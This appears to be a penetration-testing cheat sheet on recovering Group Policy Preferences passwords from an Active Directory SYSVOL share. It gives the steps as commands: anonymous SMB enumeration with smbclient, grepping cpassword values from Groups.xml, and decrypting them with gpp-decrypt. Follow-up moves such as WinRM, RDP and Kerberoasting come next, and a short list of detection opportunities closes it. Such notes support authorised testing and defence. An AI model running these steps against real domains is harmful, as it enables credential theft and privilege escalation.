# GPP Credential Extraction (SYSVOL)

## TAGS

gpp, smb, active-directory, credentials, privilege-escalation

---

## 📌 Overview

Group Policy Preferences (GPP) can store credentials in SYSVOL using an encrypted `cpassword`.

This encryption is **reversible**, allowing attackers to recover plaintext credentials.

---

## 🔍 When to Use

IF:

* SMB access is available (anonymous or authenticated)
* SYSVOL share is accessible
* Domain environment detected

THEN:
→ Check for GPP credentials

---

## 📂 Common Locations

```
\\<target>\SYSVOL\<domain>\Policies\*\MACHINE\Preferences\Groups\Groups.xml
```

Other possible:

* Services.xml
* ScheduledTasks.xml
* DataSources.xml

---

## ⚙️ Exploitation Steps

### 1. Enumerate SMB

```
smbclient -L //<target> -N
```

---

### 2. Access SYSVOL / Replication

```
smbclient //<target>/SYSVOL -N
```

---

### 3. Locate XML files

Look for:

```
Groups.xml
```

---

### 4. Extract cpassword

```
grep -oP 'cpassword="\K[^"]+' Groups.xml
```

---

### 5. Decrypt Password

```
gpp-decrypt <cpassword>
```

---

## 🔑 Output

```
username : plaintext_password
```

---

## 🚀 Next Steps

* Re-authenticate SMB with creds
* Enumerate shares
* Attempt WinRM / RDP / WMI
* Perform Kerberoasting if domain user

---

## ⚠️ Detection Opportunities

* Access to SYSVOL from unusual hosts
* Reads of Groups.xml
* Use of GPP decryption tools

---

## 🧠 Notes

* Common in older or misconfigured AD environments
* Often leads to **service account compromise**
* Frequently chained with **Kerberoasting**

---
